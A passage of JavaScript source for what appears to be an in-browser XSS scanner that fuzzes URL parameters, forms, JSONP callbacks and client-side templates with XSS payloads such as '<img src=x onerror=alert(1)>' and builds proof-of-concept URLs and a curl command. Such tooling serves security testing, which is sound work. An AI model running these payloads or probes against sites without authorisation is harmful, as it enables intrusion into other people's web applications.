        // This prevents FPs from pages with dynamic scripts that happen to use alert/location
        const containsPayload =
          scriptLower.includes(payloadLower.substring(0, Math.min(20, payloadLower.length))) ||
          (script.length < 100 && (scriptLower.includes('alert(1)') || scriptLower.includes('alert`1`')));

        if (containsPayload) {
          return {
            type: 'script_injection',
            description: `Injected script tag with payload content`,
          };
        }
      }
    }

    // Check for NEW event handlers - but only if they contain XSS patterns from our payload
    const newHandlers = [...test.eventHandlers].filter(h => !baseline.eventHandlers.has(h));
    if (newHandlers.length > 0) {
      for (const handler of newHandlers) {
        const handlerValue = handler.split('=')[1] || '';
        // Only report if handler contains executable code patterns likely from our payload
        // This prevents FPs from pages that just have different UI for different param values
        const xssPatterns = ['alert(', 'alert`', 'confirm(', 'prompt(', 'eval(', 'document.',
                            'window.', 'location', 'cookie', 'onfocus', 'onerror', 'onload'];
        const hasXSSPattern = xssPatterns.some(p => handlerValue.includes(p));

        if (hasXSSPattern) {
          const execCheck = checkExecutableContext(handlerValue);
          return {
            type: 'event_handler',
            description: `New event handler with XSS pattern: ${handler}${execCheck.pattern ? ` (${execCheck.pattern})` : ''}`,
          };
        }
      }
    }

    // Check for NEW javascript: iframes or data: iframes
    const newIframes = [...test.iframeSrcs].filter(s => !baseline.iframeSrcs.has(s));
    if (newIframes.some(s => s.startsWith('javascript:') || s.startsWith('data:text/html') || s.startsWith('srcdoc:'))) {
      return { type: 'javascript_iframe', description: 'JavaScript/data iframe detected' };
    }

    // Check for NEW javascript: links
    const newLinks = [...test.linkHrefs].filter(h => !baseline.linkHrefs.has(h));
    if (newLinks.some(h => h.startsWith('javascript:'))) {
      return { type: 'javascript_link', description: 'JavaScript link detected' };
    }

    // Check for NEW javascript: objects/embeds
    const newObjects = [...test.objectData].filter(d => !baseline.objectData.has(d));
    if (newObjects.some(d => d.startsWith('javascript:') || d.startsWith('data:text/html'))) {
      return { type: 'javascript_object', description: 'JavaScript object/embed detected' };
    }

    // Check for NEW javascript: form actions
    const newFormActions = [...(test.formActions || [])].filter(a => !(baseline.formActions || new Set()).has(a));
    if (newFormActions.some(a => a.startsWith('javascript:'))) {
      return { type: 'javascript_form', description: 'JavaScript form action detected' };
    }

    return null;
  }

  // ============================================
  // DOM XSS TAINT ANALYSIS (from taint_analyzer.rs)
  // ============================================

  function analyzeDOM_XSS() {
    const vulns = [];

    // Get all inline scripts
    const scripts = document.querySelectorAll('script:not([src])');
    let allJS = '';
    scripts.forEach(s => allJS += s.innerHTML + '\n');

    // Also check external scripts we can access
    // (Note: in browser context, we're limited to inline scripts)

    // Find taint flows
    const taintedVars = findTaintedVariables(allJS);
    const sinkUsages = findSinkUsages(allJS);

    for (const sink of sinkUsages) {
      // Check if any tainted var reaches this sink
      for (const [varName, source] of taintedVars) {
        if (sink.code.includes(varName)) {
          // Check for sanitization
          const hasSanitization = SANITIZERS.some(s =>
            allJS.includes(s) && allJS.indexOf(s) < sink.line
          );

          if (!hasSanitization) {
            vulns.push({
              type: 'DOM_XSS',
              source: source,
              sink: sink.type,
              sinkName: sink.name,
              evidence: `Tainted var '${varName}' (from ${source}) flows to ${sink.name}`,
              code: sink.code.substring(0, 100),
            });
          }
        }
      }
    }

    // Direct source-to-sink patterns
    const directPatterns = [
      { pattern: /\.innerHTML\s*=\s*[^;]*(location\.hash|location\.search|location\.href)/gi, sink: 'innerHTML' },
      { pattern: /document\.write\s*\([^)]*?(location\.hash|location\.search|location\.href)/gi, sink: 'document.write' },
      { pattern: /eval\s*\([^)]*?(location\.hash|location\.search)/gi, sink: 'eval' },
      { pattern: /\$\([^)]*\)\.html\s*\([^)]*?(location\.hash|location\.search)/gi, sink: '$.html' },
      { pattern: /\.outerHTML\s*=\s*[^;]*(location\.hash|location\.search)/gi, sink: 'outerHTML' },
    ];

    for (const { pattern, sink } of directPatterns) {
      const matches = allJS.match(pattern);
      if (matches) {
        matches.forEach(m => {
          const source = m.includes('location.hash') ? 'location.hash' :
                        m.includes('location.search') ? 'location.search' : 'location.href';
          vulns.push({
            type: 'DOM_XSS',
            source: source,
            sink: sink,
            sinkName: sink,
            evidence: `Direct flow: ${source} → ${sink}`,
            code: m.substring(0, 100),
          });
        });
      }
    }

    return vulns;
  }

  function findTaintedVariables(code) {
    const tainted = [];
    const patterns = [
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*location\.hash/g, source: 'location.hash' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*location\.search/g, source: 'location.search' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*location\.href/g, source: 'location.href' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*document\.URL/g, source: 'document.URL' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*document\.referrer/g, source: 'document.referrer' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*window\.name/g, source: 'window.name' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*[^;]*URLSearchParams/g, source: 'URLSearchParams' },
      { regex: /(?:const|let|var)\s+(\w+)\s*=\s*decodeURIComponent\s*\([^)]*location/g, source: 'location (decoded)' },
    ];

    for (const { regex, source } of patterns) {
      let match;
      while ((match = regex.exec(code)) !== null) {
        const varName = match[1];
        if (!['undefined', 'null', 'true', 'false', 'this'].includes(varName)) {
          tainted.push([varName, source]);
        }
      }
    }

    return tainted;
  }

  function findSinkUsages(code) {
    const sinks = [];
    const lines = code.split('\n');

    const sinkPatterns = [
      { regex: /\.innerHTML\s*\+?=/g, type: 'innerHTML', name: 'innerHTML' },
      { regex: /\.outerHTML\s*\+?=/g, type: 'outerHTML', name: 'outerHTML' },
      { regex: /document\.write\s*\(/g, type: 'document.write', name: 'document.write' },
      { regex: /document\.writeln\s*\(/g, type: 'document.write', name: 'document.writeln' },
      { regex: /eval\s*\(/g, type: 'eval', name: 'eval' },
      { regex: /setTimeout\s*\([^,)]*,/g, type: 'setTimeout', name: 'setTimeout' },
      { regex: /setInterval\s*\([^,)]*,/g, type: 'setInterval', name: 'setInterval' },
      { regex: /new\s+Function\s*\(/g, type: 'Function', name: 'new Function' },
      { regex: /\.html\s*\(/g, type: 'jQuery.html', name: '$.html' },
      { regex: /\.append\s*\(/g, type: 'jQuery.append', name: '$.append' },
      { regex: /\.insertAdjacentHTML\s*\(/g, type: 'insertAdjacentHTML', name: 'insertAdjacentHTML' },
    ];

    lines.forEach((line, idx) => {
      for (const { regex, type, name } of sinkPatterns) {
        if (regex.test(line)) {
          sinks.push({
            type,
            name,
            line: idx + 1,
            code: line.trim(),
          });
        }
      }
    });

    return sinks;
  }

  // ============================================
  // PROOF-BASED XSS TESTING (from proof_xss_scanner.rs)
  // ============================================

  async function testParameterWithProof(url, paramName, originalValue) {
    console.log(`[XSS Scanner] Testing parameter: ${paramName}`);

    const canary = 'LNKR_' + Math.random().toString(36).substring(2, 10);
    const probe = canary + '"\'<>/\\`${}';

    try {
      // Step 1: Baseline request with canary
      const baselineUrl = buildTestUrl(url, paramName, canary);
      const baselineResp = await fetch(baselineUrl, { credentials: 'include' });
      const baselineHtml = await baselineResp.text();

      // Check for reflection
      if (!baselineHtml.toLowerCase().includes(canary.toLowerCase())) {
        console.log(`[XSS Scanner] No reflection for ${paramName}`);
        return null;
      }

      // Step 2: Determine context
      const context = analyzeContext(baselineHtml, canary);
      console.log(`[XSS Scanner] Context: ${context}`);

      if (context === CONTEXTS.NONE) return null;

      // Step 3: Probe with break characters
      const probeUrl = buildTestUrl(url, paramName, probe);
      const probeResp = await fetch(probeUrl, { credentials: 'include' });
      const probeHtml = await probeResp.text();

      // Step 4: Analyze escaping
      const escaping = analyzeEscaping(baselineHtml, probeHtml, canary, probe);
      console.log(`[XSS Scanner] Escaping:`, escaping);

      // Step 5: Prove exploitability
      const isVulnerable = !preventsXSS(context, escaping);

      if (isVulnerable) {
        const payload = getExploitPayload(context);
        const pocUrl = buildTestUrl(url, paramName, payload);
        return {
          type: 'REFLECTED_XSS',
          subtype: 'Proof-Based',
          parameter: paramName,
          context: context,
          contextName: getContextName(context),
          severity: CONTEXT_SEVERITY[context],
          url: url,
          payload: payload,
          pocUrl: pocUrl,
          proof: {
            canary: canary,
            reflectionFound: true,
            contextType: context,
            unescapedChars: escaping.unescapedChars,
            escapedChars: escaping.escapedChars,
          },
          explanation: getExplanation(context, escaping),
        };
      }

      console.log(`[XSS Scanner] ${paramName} is properly sanitized`);
      return null;

    } catch (error) {
      console.error(`[XSS Scanner] Error testing ${paramName}:`, error);
      return null;
    }
  }

  // ============================================
  // DIFFERENTIAL FUZZING
  // ============================================

  /**
   * Detect JSONP callback XSS
   * Tests if response wraps content in callback function that can be exploited
   */
  async function testJSONPCallback(url, paramName) {
    console.log(`[XSS Scanner] JSONP callback test: ${paramName}`);

    // Common callback parameter names
    const callbackParams = ['callback', 'cb', 'jsonp', 'jsonpcallback', 'func', 'function', 'call'];
    const isCallbackParam = callbackParams.includes(paramName.toLowerCase());

    if (!isCallbackParam) return null;

    try {
      // Test with simple callback name
      const testCallback = 'lonkeroCallback' + Math.random().toString(36).substring(2, 6);
      const testUrl = buildTestUrl(url, paramName, testCallback);
      const resp = await fetch(testUrl, { credentials: 'include' });
      const text = await resp.text();

      // Check if response wraps in callback - patterns like callback({...}) or callback([...])
      const callbackPatterns = [
        new RegExp(`^\\s*${testCallback}\\s*\\(`),
        new RegExp(`^\\s*["']?${testCallback}["']?\\s*\\(`),
        new RegExp(`${testCallback}\\s*\\(\\s*[{\\[]`),
      ];

      const hasCallbackWrapping = callbackPatterns.some(p => p.test(text));

      if (hasCallbackWrapping) {
        console.log(`[XSS Scanner] JSONP callback detected for ${paramName}`);

        // Now test if we can inject JS via callback name
        for (const payload of JSONP_PAYLOADS) {
          const exploitUrl = buildTestUrl(url, paramName, payload);
          try {
            const exploitResp = await fetch(exploitUrl, { credentials: 'include' });
            const exploitText = await exploitResp.text();

            // Check if our payload appears unescaped in function position
            const dangerous = [
              exploitText.includes('alert('),
              exploitText.includes('alert`'),
              exploitText.match(/^\s*alert/),
              exploitText.includes('constructor('),
              exploitText.match(/\)\s*;\s*alert/),
            ];

            if (dangerous.some(d => d)) {
              const pocUrl = buildTestUrl(url, paramName, payload);
              return {
                type: 'JSONP_XSS',
                subtype: 'Callback Injection',
                parameter: paramName,
                severity: 'high',
                url: url,
                payload: payload,
                pocUrl: pocUrl,
                proof: {
                  callbackDetected: true,
                  response: exploitText.substring(0, 200),
                },
                explanation: `JSONP endpoint allows arbitrary callback function names. Payload reflects in executable position.`,
              };
            }
          } catch {}
        }

        // Even if payloads didn't work, report callback reflection as potential issue
        const pocUrl = buildTestUrl(url, paramName, 'alert');
        return {
          type: 'JSONP_XSS',
          subtype: 'Callback Reflection',
          parameter: paramName,
          severity: 'medium',
          url: url,
          payload: testCallback,
          pocUrl: pocUrl,
          proof: {
            callbackDetected: true,
            response: text.substring(0, 200),
          },
          explanation: `JSONP endpoint reflects callback parameter. May be exploitable with right payload.`,
        };
      }

      return null;
    } catch (error) {
      console.error(`[XSS Scanner] JSONP test error:`, error);
      return null;
    }
  }

  /**
   * Test for template injection (Angular, Vue, etc.)
   * Uses unique math results to avoid false positives from naturally occurring numbers
   */
  async function testTemplateInjection(url, paramName) {
    console.log(`[XSS Scanner] Template injection test: ${paramName}`);

    try {
      // First get baseline to check what numbers already exist on the page
      const baselineUrl = buildTestUrl(url, paramName, 'TPLBASELINE');
      const baselineResp = await fetch(baselineUrl, { credentials: 'include' });
      const baselineHtml = await baselineResp.text();

      // Use unique numbers unlikely to appear naturally
      const probes = [
        { template: '{{191*7}}', result: '1337' },      // 191*7 = 1337
        { template: '{{13*101}}', result: '1313' },     // 13*101 = 1313
      ];

      let successfulProbe = null;

      for (const probe of probes) {
        // Skip if result already exists in baseline (would be false positive)
        if (baselineHtml.includes(probe.result)) {
          console.log(`[XSS Scanner] Skipping ${probe.result} - exists in baseline`);
          continue;
        }

        const probeUrl = buildTestUrl(url, paramName, probe.template);
        const resp = await fetch(probeUrl, { credentials: 'include' });
        const html = await resp.text();

        // Template must be evaluated (result appears) AND template syntax removed
        if (html.includes(probe.result) && !html.includes(probe.template)) {
          successfulProbe = probe;
          break;
        }
      }

      // Only report if we have confirmed evaluation with a unique number
      if (successfulProbe) {
        console.log(`[XSS Scanner] Template evaluation CONFIRMED for ${paramName}: ${successfulProbe.template} → ${successfulProbe.result}`);

        // Try XSS payloads (only first 5 to save time)
        for (const payload of TEMPLATE_PAYLOADS.slice(0, 5)) {
          const testUrl = buildTestUrl(url, paramName, payload);
          try {
            const testResp = await fetch(testUrl, { credentials: 'include' });
            const testHtml = await testResp.text();

            // Check for signs of code execution (not in baseline)
            if ((testHtml.includes('alert(') && !baselineHtml.includes('alert(')) ||
                (testHtml.includes('constructor') && !baselineHtml.includes('constructor')) ||
                testHtml.match(/\[object\s+(Window|Object|Function)\]/)) {
              const pocUrl = buildTestUrl(url, paramName, payload);
              return {
                type: 'TEMPLATE_INJECTION',
                subtype: 'Client-Side Template Injection',
                parameter: paramName,
                severity: 'high',
                url: url,
                payload: payload,
                pocUrl: pocUrl,
                proof: {
                  templateEvaluated: true,
                  mathProbe: `${successfulProbe.template} → ${successfulProbe.result}`,
                },
                explanation: `Template injection: expressions are evaluated. Payload: ${payload}`,
              };
            }
          } catch {}
        }

        // Report template eval even without full XSS
        const pocUrl = buildTestUrl(url, paramName, successfulProbe.template);
        return {
          type: 'TEMPLATE_INJECTION',
          subtype: 'Template Expression Evaluation',
          parameter: paramName,
          severity: 'medium',
          url: url,
          payload: successfulProbe.template,
          pocUrl: pocUrl,
          proof: {
            templateEvaluated: true,
            evidence: `${successfulProbe.template} evaluated to ${successfulProbe.result}`,
          },
          explanation: `Template expressions are evaluated. Could lead to XSS with right payload.`,
        };
      }

      // Also check ${} syntax with unique result
      if (!baselineHtml.includes('1337')) {
        const es6Probe = '${191*7}';
        const es6Url = buildTestUrl(url, paramName, es6Probe);
        const es6Resp = await fetch(es6Url, { credentials: 'include' });
        const es6Html = await es6Resp.text();

        if (es6Html.includes('1337') && !es6Html.includes('${191*7}')) {
          const payload = '${alert(1)}';
          const pocUrl = buildTestUrl(url, paramName, payload);
          return {
            type: 'TEMPLATE_INJECTION',
            subtype: 'ES6 Template Literal Injection',
            parameter: paramName,
            severity: 'high',
            url: url,
            payload: payload,
            pocUrl: pocUrl,
            proof: {
              templateEvaluated: true,
              evidence: '${191*7} evaluated to 1337',
            },
            explanation: `ES6 template literal injection: expressions are evaluated server-side.`,
          };
        }
      }

      return null;
    } catch (error) {
      console.error(`[XSS Scanner] Template test error:`, error);
      return null;
    }
  }

  /**
   * Test for BBCode javascript: URL injection
   * BBCode parsers may allow javascript: in [url] tags
   */
  async function testBBCodeInjection(url, paramName) {
    // Only test parameters that might contain BBCode
    const bbcodeParams = ['code', 'bbcode', 'content', 'text', 'message', 'body', 'post'];
    if (!bbcodeParams.includes(paramName.toLowerCase())) return null;

    const bbcodePayloads = [
      '[url=javascript:alert(1)]click[/url]',
      '[url]javascript:alert(1)[/url]',
      '[img]javascript:alert(1)[/img]',
      '[url=javascript:alert`1`]x[/url]',
      '[link=javascript:alert(1)]x[/link]',
      '[a href="javascript:alert(1)"]x[/a]',
    ];

    try {
      for (const payload of bbcodePayloads) {
        const testUrl = buildTestUrl(url, paramName, payload);
        const resp = await fetch(testUrl, { credentials: 'include' });
        const html = await resp.text();

        // Check if javascript: URL made it through to href attribute
        // Must verify our payload is actually in the href, not just any existing javascript: link
        const jsHrefPatterns = [
          /href\s*=\s*"javascript:[^"]*alert\s*[(`]/i,
          /href\s*=\s*'javascript:[^']*alert\s*[(`]/i,
          /href\s*=\s*javascript:[^\s>]*alert/i,
        ];

        const hasInjectedJsHref = jsHrefPatterns.some(p => p.test(html));

        if (hasInjectedJsHref) {
          const pocUrl = buildTestUrl(url, paramName, payload);
          return {
            type: 'BBCODE_XSS',
            subtype: 'BBCode JavaScript URL Injection',
            parameter: paramName,
            severity: 'high',
            url: url,
            payload: payload,
            pocUrl: pocUrl,
            proof: {
              javascriptUrlInHref: true,
            },
            explanation: 'BBCode parser allows javascript: URLs in link attributes.',
          };
        }
      }
    } catch {}
    return null;
  }

  /**
   * Test POST forms for XSS by submitting payloads
   */
  async function testPOSTFormXSS(formAction, formInputs, baseUrl) {
    const results = [];
    const xssPayloads = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
    ];

    for (const input of formInputs) {
      if (input.type === 'hidden' || input.type === 'submit') continue;

      for (const payload of xssPayloads) {
        try {
          // Build form data with payload in target field
          const formData = new FormData();
          for (const field of formInputs) {
            if (field.name === input.name) {
              formData.append(field.name, payload);
            } else if (field.value) {
              formData.append(field.name, field.value);
            } else {
              formData.append(field.name, 'test');
            }
          }

          const resp = await fetch(formAction || baseUrl, {
            method: 'POST',
            body: formData,
            credentials: 'include',
          });
          const html = await resp.text();

          // Check if payload reflected unescaped
          if (html.includes(payload) ||
              (html.includes('<script>alert(1)') && payload.includes('<script>')) ||
              (html.includes('onerror=alert(1)') && payload.includes('onerror'))) {
            results.push({
              type: 'REFLECTED_XSS',
              subtype: 'POST Form Injection',
              parameter: input.name,
              formAction: formAction,
              severity: 'high',
              url: baseUrl,
              payload: payload,
              pocUrl: `${formAction || baseUrl} [POST ${input.name}=${encodeURIComponent(payload)}]`,
              curlPoc: `curl -X POST "${formAction || baseUrl}" -d "${input.name}=${encodeURIComponent(payload)}"`,
              proof: {
                formMethod: 'POST',
                inputName: input.name,
                payloadUsed: payload,
              },
              explanation: `POST form field "${input.name}" reflects XSS payload unescaped.`,
            });
            break; // Found XSS for this input, move to next
          }
        } catch {}
      }
    }
    return results;
  }

  async function differentialFuzz(url, paramName) {
    console.log(`[XSS Scanner] Differential fuzzing: ${paramName}`);

    try {
      // Get baseline
      const baselineResp = await fetch(url, { credentials: 'include' });
      const baselineHtml = await baselineResp.text();
      const baselineDom = parseDomStructure(baselineHtml);

      // Test payloads in parallel (batches of 5)
      // Include template payloads in differential testing
      const allPayloads = [...PRIORITY_PAYLOADS.map(p => p.payload), ...EVASION_PAYLOADS, ...TEMPLATE_PAYLOADS];

      for (let i = 0; i < allPayloads.length; i += 5) {
        const batch = allPayloads.slice(i, i + 5);
        const results = await Promise.all(
          batch.map(async payload => {
            const testUrl = buildTestUrl(url, paramName, payload);
            try {
              const resp = await fetch(testUrl, { credentials: 'include' });
              const html = await resp.text();
              return { payload, html };
            } catch {
              return null;
            }
          })
        );

        for (const result of results) {
          if (!result) continue;
          const testDom = parseDomStructure(result.html);
          const diff = detectXSSByDiff(baselineDom, testDom, url, paramName, result.payload);

          if (diff) {
            const pocUrl = buildTestUrl(url, paramName, result.payload);
            return {
              type: 'REFLECTED_XSS',
              subtype: 'Differential',
              parameter: paramName,
              severity: 'high',
              url: url,
              payload: result.payload,
              pocUrl: pocUrl,
              proof: {
                diffType: diff.type,
                description: diff.description,
              },
              explanation: `DOM differential analysis: ${diff.description}`,
            };
          }
        }
      }

      return null;
    } catch (error) {
      console.error(`[XSS Scanner] Differential error for ${paramName}:`, error);
      return null;
    }
  }

  // ============================================
  // COMPREHENSIVE SCAN
  // ============================================

  // Extended list of common parameter names to probe
  const COMMON_PARAMS = [
    // Search & Query
    'q', 'query', 'search', 'keyword', 'keywords', 'term', 's', 'find', 'lookup',
    // ID & References
    'id', 'ID', 'Id', 'ref', 'item', 'product', 'article', 'post', 'page', 'p',
    // User & Auth
    'user', 'username', 'name', 'email', 'login', 'account', 'uid', 'userid',
    // Messages & Content
    'msg', 'message', 'text', 'content', 'body', 'title', 'description', 'comment',
    'note', 'feedback', 'review', 'subject', 'bio',
    // Data & Values
    'data', 'value', 'val', 'input', 'param', 'args', 'payload',
    // URLs & Redirects
    'url', 'uri', 'link', 'href', 'src', 'redirect', 'redirect_uri', 'redirect_url',
    'return', 'return_url', 'returnUrl', 'returnTo', 'next', 'goto', 'target', 'dest',
    'destination', 'continue', 'forward', 'to', 'out', 'view', 'show',
    // Callbacks & Actions
    'callback', 'cb', 'jsonp', 'function', 'func', 'action', 'do', 'cmd', 'command',
    // Errors & Debug
    'error', 'err', 'warning', 'info', 'debug', 'test', 'dev', 'mode',
    // File & Path
    'file', 'filename', 'path', 'filepath', 'dir', 'folder', 'template', 'tpl',
    'include', 'require', 'load', 'read',
    // HTML & Display
    'html', 'output', 'display', 'render', 'print', 'format', 'style', 'class',
    'lang', 'language', 'locale', 'code',
    // API & JSON
    'api', 'key', 'token', 'auth', 'json', 'xml', 'format', 'type', 'category',
    'tag', 'label', 'filter', 'sort', 'order', 'limit', 'offset', 'start', 'end',
    // Misc common
    'from', 'source', 'origin', 'referrer', 'referer', 'r', 'u', 'v', 'c', 't',
    'preview', 'edit', 'delete', 'remove', 'add', 'create', 'update', 'save',
    // XSS-prone params (diff viewers, polls, configs, etc.)
    'left', 'right', 'old', 'new', 'before', 'after', 'diff',
    'options', 'option', 'choice', 'choices', 'select',
    'header', 'headers', 'footer', 'heading',
    'config', 'settings', 'prefs', 'preferences',
    'snippet', 'script', 'css', 'js',
    'question', 'answer', 'poll', 'vote',
    'image', 'img', 'photo', 'avatar', 'icon', 'logo',
    'first', 'last', 'middle', 'prefix', 'suffix',
  ];

  async function comprehensiveScan() {
    console.log('[XSS Scanner] Starting comprehensive XSS scan...');

    const url = new URL(location.href);
    const existingParams = Array.from(url.searchParams.entries());
    const results = [];
    const testedParams = new Set();

    // Phase 1: DOM XSS (instant, no network)
    console.log('[XSS Scanner] Phase 1: DOM XSS Analysis');
    const domVulns = analyzeDOM_XSS();
    for (const vuln of domVulns) {
      // Build POC URL based on source type
      let pocUrl = location.href;
      if (vuln.source === 'location.hash') {
        pocUrl = location.origin + location.pathname + location.search + '#<img src=x onerror=alert(1)>';
      } else if (vuln.source === 'location.search') {
        const testUrl = new URL(location.href);
        testUrl.searchParams.set('xss', '<img src=x onerror=alert(1)>');
        pocUrl = testUrl.toString();
      }

      const finding = {
        type: 'DOM_XSS',
        severity: 'high',
        url: location.href,
        pocUrl: pocUrl,
        source: vuln.source,
        sink: vuln.sinkName,
        evidence: vuln.evidence,
        code: vuln.code,
        payload: '<img src=x onerror=alert(1)>',
        explanation: `Tainted data from ${vuln.source} flows to dangerous sink ${vuln.sinkName}`,
      };
      results.push(finding);
      reportFinding(finding);
    }

    // Phase 2: Test existing URL parameters
    if (existingParams.length > 0) {
      console.log(`[XSS Scanner] Phase 2: Testing ${existingParams.length} existing parameters`);
      for (const [name, value] of existingParams) {
        testedParams.add(name);
        const vuln = await testParameterFull(location.href, name, value);
        if (vuln) {
          results.push(vuln);
          reportFinding(vuln);
        }
      }
    } else {
      console.log('[XSS Scanner] Phase 2: No existing parameters, skipping');
    }

    // Phase 3: Hash-based XSS
    if (location.hash) {
      console.log('[XSS Scanner] Phase 3: Hash analysis');
      checkHashXSS(location.hash);
    }

    // Phase 4: AGGRESSIVE parameter discovery (ALWAYS runs)
    console.log('[XSS Scanner] Phase 4: Aggressive parameter discovery');
    await discoverAndTestParams(results, testedParams);

    // Phase 5: Form-based XSS testing
    console.log('[XSS Scanner] Phase 5: Form scanning');
    await scanFormsForXSS(results);

    console.log(`[XSS Scanner] Scan complete. Found ${results.length} vulnerabilities.`);
    scanComplete = true;

    window.postMessage({
      type: '__lonkero_xss_scan_complete__',
      findings: results,
      tested: [...testedParams],
    }, '*');

    return results;
  }

  /**
   * Full test: JSONP first (for callback params), then proof-based + differential + template
   */
  async function testParameterFull(url, paramName, value) {
    let vuln = null;

    // Check JSONP FIRST for callback-like params (before HTML-based tests fail)
    const callbackParams = ['callback', 'cb', 'jsonp', 'jsonpcallback', 'func', 'function', 'call'];
    if (callbackParams.includes(paramName.toLowerCase())) {
      vuln = await testJSONPCallback(url, paramName);
      if (vuln) return vuln;
    }

    // Try proof-based detection (for HTML responses)
    vuln = await testParameterWithProof(url, paramName, value);
    if (vuln) return vuln;

    // Try differential fuzzing
    vuln = await differentialFuzz(url, paramName);
    if (vuln) return vuln;

    // Test for template injection
    vuln = await testTemplateInjection(url, paramName);
    if (vuln) return vuln;

    // Test JSONP for non-callback params too (some APIs use different param names)
    if (!callbackParams.includes(paramName.toLowerCase())) {
      vuln = await testJSONPCallback(url, paramName);
    }

    return vuln;
  }

  /**
   * Aggressively discover and test common parameters
   */
  async function discoverAndTestParams(existingResults, testedParams) {
    const baseUrl = new URL(location.href);
    const discoveredReflections = [];

    // Batch probe parameters (5 at a time for speed)
    console.log(`[XSS Scanner] Probing ${COMMON_PARAMS.length} common parameter names...`);

    for (let i = 0; i < COMMON_PARAMS.length; i += 5) {
      const batch = COMMON_PARAMS.slice(i, i + 5);

      const probeResults = await Promise.all(batch.map(async param => {
        if (testedParams.has(param) || baseUrl.searchParams.has(param)) {
          return null;
        }

        const canary = 'XSS' + Math.random().toString(36).substring(2, 8);
        const testUrl = new URL(location.href);
        testUrl.searchParams.set(param, canary);

        try {
          const resp = await fetch(testUrl.toString(), { credentials: 'include' });
          if (resp.ok) {
            const html = await resp.text();
            if (html.includes(canary)) {
              return { param, canary, url: testUrl.toString() };
            }
          }
        } catch {
          // Ignore
        }
        return null;
      }));

      for (const result of probeResults) {
        if (result) {
          discoveredReflections.push(result);
        }
      }
    }

    console.log(`[XSS Scanner] Found ${discoveredReflections.length} reflectable parameters`);

    // Now test each discovered reflection point
    for (const { param, canary, url } of discoveredReflections) {
      console.log(`[XSS Scanner] Testing discovered param: ${param}`);
      testedParams.add(param);

      const vuln = await testParameterFull(url, param, canary);
      if (vuln) {
        existingResults.push(vuln);
        reportFinding(vuln);
      }
    }
  }

  /**
   * Scan forms on the page for XSS
   */
  async function scanFormsForXSS(existingResults) {
    const forms = document.querySelectorAll('form');
    if (forms.length === 0) {
      console.log('[XSS Scanner] No forms found on page');
      return;
    }

    console.log(`[XSS Scanner] Found ${forms.length} forms to test`);

    for (const form of forms) {
      const action = form.action || location.href;
      const method = (form.method || 'GET').toUpperCase();

      // Get form inputs
      const inputs = form.querySelectorAll('input[name], textarea[name], select[name]');
      if (inputs.length === 0) continue;

      // For GET forms, test as URL parameters
      if (method === 'GET') {
        for (const input of inputs) {
          const paramName = input.name;
          if (!paramName) continue;

          console.log(`[XSS Scanner] Testing form field: ${paramName}`);
          const vuln = await testParameterFull(action, paramName, 'test');
          if (vuln) {
            vuln.formAction = action;
            vuln.formMethod = method;
            existingResults.push(vuln);
            reportFinding(vuln);
          }
        }
      }

      // For POST forms, test each field
      if (method === 'POST') {
        for (const input of inputs) {
          const paramName = input.name;
          if (!paramName) continue;

          console.log(`[XSS Scanner] Testing POST form field: ${paramName}`);
          const vuln = await testPOSTParameter(action, paramName, inputs);
          if (vuln) {
            vuln.formAction = action;
            vuln.formMethod = method;
            existingResults.push(vuln);
            reportFinding(vuln);
          }
        }
      }
    }
  }

  /**
   * Test a POST form parameter for XSS
   */
  async function testPOSTParameter(url, targetParam, allInputs) {
    const canary = 'LNKR_' + Math.random().toString(36).substring(2, 10);
    const probe = canary + '"\'<>/\\`${}';

    try {
      // Build form data with canary in target param
      const formData = new FormData();
      for (const input of allInputs) {
        if (input.name === targetParam) {
          formData.append(input.name, canary);
        } else {
          formData.append(input.name, input.value || 'test');
        }
      }

      // Send baseline request
      const baselineResp = await fetch(url, {
        method: 'POST',
        body: formData,
        credentials: 'include',
      });
      const baselineHtml = await baselineResp.text();

      // Check for reflection
      if (!baselineHtml.toLowerCase().includes(canary.toLowerCase())) {
        return null;
      }

      // Determine context
      const context = analyzeContext(baselineHtml, canary);
      if (context === CONTEXTS.NONE) return null;

      // Test with probe
      const probeData = new FormData();
      for (const input of allInputs) {
        if (input.name === targetParam) {
          probeData.append(input.name, probe);
        } else {
          probeData.append(input.name, input.value || 'test');
        }
      }

      const probeResp = await fetch(url, {
        method: 'POST',
        body: probeData,
        credentials: 'include',
      });
      const probeHtml = await probeResp.text();

      // Analyze escaping
      const escaping = analyzeEscaping(baselineHtml, probeHtml, canary, probe);
      const isVulnerable = !preventsXSS(context, escaping);

      if (isVulnerable) {
        return {
          type: 'REFLECTED_XSS',
          subtype: 'POST-Based',
          parameter: targetParam,
          context: context,
          contextName: getContextName(context),
          severity: CONTEXT_SEVERITY[context],
          url: url,
          method: 'POST',
          payload: getExploitPayload(context),
          proof: {
            canary,
            contextType: context,
            unescapedChars: escaping.unescapedChars,
          },
          explanation: getExplanation(context, escaping),
        };
      }

      return null;
    } catch (error) {
      console.error(`[XSS Scanner] POST test error for ${targetParam}:`, error);
      return null;
    }
  }

  // Keep the old function name for backward compatibility
  async function discoverInjectionPoints(existingResults) {
    await discoverAndTestParams(existingResults, new Set());
  }

  function checkHashXSS(hash) {
    // Check for suspicious patterns in current hash
    const xssPatterns = [
      { regex: /<script/i, desc: 'Script tag in hash' },
      { regex: /javascript:/i, desc: 'JavaScript URL in hash' },
      { regex: /on\w+\s*=/i, desc: 'Event handler in hash' },
      { regex: /\beval\s*\(/i, desc: 'eval() in hash' },
      { regex: /\balert\s*\(/i, desc: 'alert() in hash (test payload)' },
      { regex: /document\.(write|cookie|location)/i, desc: 'DOM manipulation in hash' },
    ];

    for (const { regex, desc } of xssPatterns) {
      if (regex.test(hash)) {
        const finding = {
          type: 'DOM_XSS_POTENTIAL',
          severity: 'high',
          url: location.href,
          pocUrl: location.href, // Already contains the malicious hash
          payload: hash,
          source: 'location.hash',
          evidence: desc,
          value: hash.substring(0, 200),
          explanation: `Suspicious pattern in URL hash: ${desc}`,
        };
        findings.push(finding);
        reportFinding(finding);
      }
    }
  }

  /**
   * Test if hash fragment is reflected into DOM unsafely
